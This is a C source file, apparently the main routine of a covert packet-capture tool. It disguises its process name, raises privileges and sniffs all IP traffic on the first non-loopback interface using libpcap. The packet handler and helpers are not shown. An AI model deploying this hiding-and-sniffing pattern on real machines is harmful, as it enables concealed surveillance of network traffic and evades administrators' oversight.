#include <pcap/pcap.h>
#include <stdio.h>
#include <string.h>

#include <errno.h>

#include "constants.h"
#include "mask.h"
#include "packet_handler.h"

void pcap_error(char *errbuf);

/*
 * Callback function for examining captured packets.
 *
 * Params:
 *      u_char* args: Pointer to user data.
 *
 *      const struct pcap_pkthdr* header: Struct that contains information about
 * the captured packet.
 *
 *      const u_char* packet: Pointer to the captured packet in serialized form.
 */
void got_packet(u_char *args, const struct pcap_pkthdr *header,
                const u_char *packet);

int main(int argc, char *argv[])
{
    if (mask_process(argv[0], NEW_PROCESS_NAME) != 0)
    {
        fprintf(stderr, "mask_process failed: %s\n", strerror(errno));
        return -1;
    }

    if (raise_privileges(0) != 0)
    {
        fprintf(stderr, "raise_privileges: %s\n", strerror(errno));
        return -1;
    }

    // TODO: Set up packet capturing engine
    pcap_if_t *alldevs, *temp;
    pcap_t *session;
    char filter_string[] = "ip";
    struct bpf_program filter_program;
    bpf_u_int32 net_addr = 0;
    bpf_u_int32 mask = 0;

    int i = 0;
    char errbuf[PCAP_ERRBUF_SIZE];

    if (pcap_findalldevs(&alldevs, errbuf) == -1)
    {
        fprintf(stderr, "pcap_findalldevs: %s\n", errbuf);
        return -1;
    }

    // Find the first non-loopback interface and use it
    for (temp = alldevs, i = 0; temp; temp = temp->next, ++i)
    {
        if (!(temp->flags & PCAP_IF_LOOPBACK))
        {
            break;
        }
    }

    // Start the sniffing session
    session = pcap_open_live(temp->name, BUFSIZ, 0, -1, errbuf);
    if (!session)
    {
        fprintf(stderr, "Could not open device %s: %s\n", temp->name, errbuf);
        return -1;
    }

    // Find IPv4 address and network number of the selected device
    if (pcap_lookupnet(temp->name, &net_addr, &mask, errbuf))
    {
        fprintf(stderr, "pcap_lookupnet: %s\n", errbuf);
        return -1;
    }

    // Compile the filter string
    if (pcap_compile(session, &filter_program, filter_string, 0, net_addr) ==
        -1)
    {
        fprintf(stderr, "Error calling pcap_compile\n");
        return -1;
    }

    // Load the filter into the capture device
    if (pcap_setfilter(session, &filter_program) == -1)
    {
        fprintf(stderr, "Error setting filter\n");
        return -1;
    }

    // Start capturing packets
    pcap_loop(session, 0, got_packet, NULL);

    // Clean up handles
    pcap_freealldevs(alldevs);
    return 0;
}
